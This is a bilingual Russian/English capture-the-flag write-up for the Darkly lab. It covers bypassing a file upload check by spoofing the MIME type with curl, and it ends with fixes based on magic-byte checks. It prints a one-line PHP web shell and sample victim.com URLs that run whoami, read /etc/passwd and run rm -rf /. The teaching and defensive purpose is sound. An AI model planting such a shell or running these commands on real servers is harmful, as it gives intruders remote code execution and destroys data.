# Unrestricted File Upload

> **Тип уязвимости / Vulnerability Type:** Unrestricted File Upload  
> **Уровень сложности / Difficulty:** Beginner  
> **Платформа / Platform:** Darkly (учебный проект / educational lab)

---

## 🇷🇺 Русская версия

### Что произошло — общая картина

На сайте есть форма загрузки файлов. Сервер проверяет только заголовок `Content-Type` — то есть верит тому что клиент сам о себе говорит. Клиент может написать туда что угодно. Мы загружаем PHP-файл, притворившись что это JPEG-картинка — сервер принимает файл и возвращает флаг.

---

### Шаг 1 — Создать PHP-файл

```bash
touch shell.php
```

**Что такое `touch`?**

Команда `touch` создаёт пустой файл. Нам не нужно писать в него никакой PHP-код — для этого задания достаточно самого факта загрузки файла с расширением `.php`. В реальной атаке сюда вписали бы веб-шелл — код который позволяет выполнять команды на сервере.

**Почему именно `.php`?**

Сервер работает на PHP. Если бы нам удалось загрузить и выполнить PHP-файл — мы получили бы полный контроль над сервером. Расширение `.php` говорит веб-серверу Apache: «запусти этот файл как PHP-скрипт». Именно поэтому загрузка PHP-файлов в веб-директорию настолько опасна.

---

### Шаг 2 — Понять что проверяет сервер

Когда браузер отправляет файл через форму, запрос содержит заголовок `Content-Type` для каждого файла в multipart-запросе. Например, при загрузке настоящего JPEG браузер автоматически ставит:

```
Content-Type: image/jpeg
```

Сервер смотрит на этот заголовок и решает: «это картинка, можно принять».

**Проблема:** этот заголовок полностью контролируется клиентом. Никто не мешает нам поставить `Content-Type: image/jpeg` для любого файла — хоть для PHP-скрипта, хоть для исполняемого бинарника. Сервер не смотрит на реальное содержимое файла.

**Что такое MIME-тип?**

MIME (Multipurpose Internet Mail Extensions) — стандарт для обозначения типа данных. Примеры:
- `image/jpeg` — JPEG-картинка
- `image/png` — PNG-картинка
- `application/php` — PHP-файл
- `text/html` — HTML-страница

Браузер обычно определяет MIME-тип автоматически по расширению файла. Но через curl мы можем указать любой MIME-тип вручную.

---

### Шаг 3 — Загрузить файл с поддельным MIME-типом

```bash
curl -X POST "http://127.0.0.1:8080/?page=upload" \
     -F "Upload=Upload" \
     -F "uploaded=@shell.php;type=image/jpeg" \
     | grep -i flag
```

**Разбор команды:**

| Часть | Что делает |
|-------|-----------|
| `curl -X POST` | Отправляет POST-запрос (как нажатие кнопки Submit в форме) |
| `"http://...?page=upload"` | URL страницы с формой загрузки |
| `-F "Upload=Upload"` | Поле формы — кнопка Submit (имитирует нажатие) |
| `-F "uploaded=@shell.php;type=image/jpeg"` | Загружаем файл `shell.php`, но говорим серверу что это `image/jpeg` |
| `\| grep -i flag` | Ищем флаг в ответе сервера |

**Что означает `@shell.php` в curl?**

Символ `@` перед именем файла говорит curl: «прочитай содержимое этого файла и отправь его». Без `@` curl отправил бы строку `shell.php` как текст.

**Что означает `;type=image/jpeg`?**

Это явное указание MIME-типа для данного файла в multipart-запросе. Вместо реального типа (`application/x-php`) мы подставляем `image/jpeg`. Сервер читает этот заголовок и думает что получил картинку.

---

### Шаг 4 — Почему сервер принял файл

Сервер выполнил проверку примерно такую:
```php
if ($_FILES['uploaded']['type'] == 'image/jpeg' ||
    $_FILES['uploaded']['type'] == 'image/png') {
    // разрешаем загрузку
}
```

`$_FILES['uploaded']['type']` — это именно то значение которое клиент указал в `Content-Type`. Сервер не анализирует реальное содержимое файла. Мы передали `image/jpeg` — проверка пройдена.

---

### Почему это критически опасно в реальной жизни

В этом задании флаг возвращается сразу. Но в реальном сценарии:

1. Загружаем `shell.php` с содержимым:
```php
<?php system($_GET['cmd']); ?>
```

2. Если файл сохраняется в веб-директорию — обращаемся к нему напрямую:
```
http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=cat /etc/passwd
http://victim.com/uploads/shell.php?cmd=rm -rf /
```

3. Мы получаем **Remote Code Execution (RCE)** — выполнение произвольного кода на сервере. Это одна из самых критических уязвимостей: полный контроль над сервером.

---

### Логика атаки — цепочка

```
Сервер проверяет только Content-Type заголовок
    ↓  Content-Type полностью контролируется клиентом
Создаём shell.php, отправляем с Content-Type: image/jpeg
    ↓  сервер видит "image/jpeg" и принимает файл
Файл загружен несмотря на расширение .php
    ↓
FLAG
```

---

### Как исправить

| Проблема | Решение |
|----------|---------|
| Проверка только `Content-Type` от клиента | Проверять **magic bytes** — первые байты файла которые определяют реальный тип |
| Расширение файла не проверяется | Whitelist расширений: принимать только `.jpg`, `.png`, `.gif` |
| Файлы сохраняются в веб-директорию | Хранить загрузки **вне веб-рута** — файлы не должны быть доступны по URL |
| Оригинальные имена файлов сохраняются | Переименовывать в случайную строку — `a3f8b2c1.jpg` вместо `shell.php` |

**Проверка magic bytes на PHP:**
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $_FILES['uploaded']['tmp_name']);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($real_mime, $allowed_mimes)) {
    die('Invalid file type');
}
```

`finfo_file()` читает реальное содержимое файла и определяет тип по magic bytes — первым байтам файла. JPEG всегда начинается с `FF D8 FF`. PHP-файл — с `<?`. Это нельзя подделать через заголовок.

---
---

## 🇬🇧 English Version

### Overview — What Happened

The site has a file upload form. The server only checks the `Content-Type` header — meaning it trusts whatever the client claims about itself. The client can write anything there. We upload a PHP file while pretending it is a JPEG image — the server accepts the file and returns the flag.

---

### Step 1 — Create a PHP File

```bash
touch shell.php
```

**What does `touch` do?**

The `touch` command creates an empty file. We don't need to write any PHP code in it — for this challenge, the mere fact of uploading a file with a `.php` extension is enough. In a real attack, this would contain a web shell — code that allows executing commands on the server.

**Why `.php` specifically?**

The server runs on PHP. If we could upload and execute a PHP file, we would gain full control over the server. The `.php` extension tells the Apache web server: "run this file as a PHP script." This is exactly why uploading PHP files into the web directory is so dangerous.

---

### Step 2 — Understand What the Server Checks

When a browser sends a file through a form, the request includes a `Content-Type` header for each file in the multipart request. For a real JPEG, the browser automatically sets:

```
Content-Type: image/jpeg
```

The server looks at this header and decides: "this is an image, accept it."

**The problem:** this header is entirely client-controlled. Nothing stops us from setting `Content-Type: image/jpeg` for any file — including a PHP script or an executable binary. The server never looks at the actual file content.

**What is a MIME type?**

MIME (Multipurpose Internet Mail Extensions) is a standard for identifying data types. Examples:
- `image/jpeg` — JPEG image
- `image/png` — PNG image
- `application/php` — PHP file
- `text/html` — HTML page

Browsers normally determine the MIME type automatically from the file extension. But with curl, we can specify any MIME type manually.

---

### Step 3 — Upload the File with a Spoofed MIME Type

```bash
curl -X POST "http://127.0.0.1:8080/?page=upload" \
     -F "Upload=Upload" \
     -F "uploaded=@shell.php;type=image/jpeg" \
     | grep -i flag
```

**Command breakdown:**

| Part | What it does |
|------|-------------|
| `curl -X POST` | Sends a POST request (like clicking Submit on a form) |
| `"http://...?page=upload"` | URL of the upload form page |
| `-F "Upload=Upload"` | Form field — the Submit button (simulates clicking it) |
| `-F "uploaded=@shell.php;type=image/jpeg"` | Uploads `shell.php` but tells the server it is `image/jpeg` |
| `\| grep -i flag` | Searches for the flag in the server response |

**What does `@shell.php` mean in curl?**

The `@` character before a filename tells curl: "read the contents of this file and send them." Without `@`, curl would send the string `shell.php` as plain text.

**What does `;type=image/jpeg` mean?**

This explicitly sets the MIME type for this file in the multipart request. Instead of the real type (`application/x-php`), we substitute `image/jpeg`. The server reads this header and thinks it received an image.

---

### Step 4 — Why the Server Accepted the File

The server performed a check roughly like this:
```php
if ($_FILES['uploaded']['type'] == 'image/jpeg' ||
    $_FILES['uploaded']['type'] == 'image/png') {
    // allow upload
}
```

`$_FILES['uploaded']['type']` is exactly the value the client specified in `Content-Type`. The server never analyzes the actual file content. We sent `image/jpeg` — check passed.

---

### Why This Is Critically Dangerous in Real Life

In this challenge the flag is returned immediately. But in a real scenario:

1. Upload `shell.php` with this content:
```php
<?php system($_GET['cmd']); ?>
```

2. If the file is saved into the web directory — access it directly:
```
http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=cat /etc/passwd
http://victim.com/uploads/shell.php?cmd=rm -rf /
```

3. We achieve **Remote Code Execution (RCE)** — arbitrary code execution on the server. This is one of the most critical vulnerabilities: complete control over the server.

---

### Attack Chain Summary

```
Server checks only the client-supplied Content-Type header
    ↓  Content-Type is entirely client-controlled
We create shell.php and send it with Content-Type: image/jpeg
    ↓  server sees "image/jpeg" and accepts the file
File is uploaded despite the .php extension
    ↓
FLAG
```

---

### How to Fix

| Problem | Fix |
|---------|-----|
| Only client-supplied `Content-Type` is checked | Validate **magic bytes** — the first bytes of the file that reveal its real type |
| File extension is not validated | Whitelist extensions: accept only `.jpg`, `.png`, `.gif` |
| Files are saved inside the web directory | Store uploads **outside the web root** — files must not be accessible via URL |
| Original filenames are preserved | Rename to a random string — `a3f8b2c1.jpg` instead of `shell.php` |

**Magic bytes check in PHP:**
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $_FILES['uploaded']['tmp_name']);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($real_mime, $allowed_mimes)) {
    die('Invalid file type');
}
```

`finfo_file()` reads the actual file content and determines the type from magic bytes — the first bytes of the file. A JPEG always starts with `FF D8 FF`. A PHP file starts with `<?`. This cannot be faked through a header.

---
